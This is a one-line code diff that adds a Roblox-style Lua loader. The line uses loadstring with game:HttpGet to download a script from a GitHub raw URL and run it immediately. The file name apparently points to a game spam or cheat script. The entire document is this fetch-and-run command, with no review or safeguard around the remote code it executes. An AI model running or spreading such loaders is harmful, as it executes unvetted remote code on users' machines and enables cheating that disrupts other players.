@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/7-days-cat-sitting-spam5-7l3t5vdte0cxzc.lua"))()
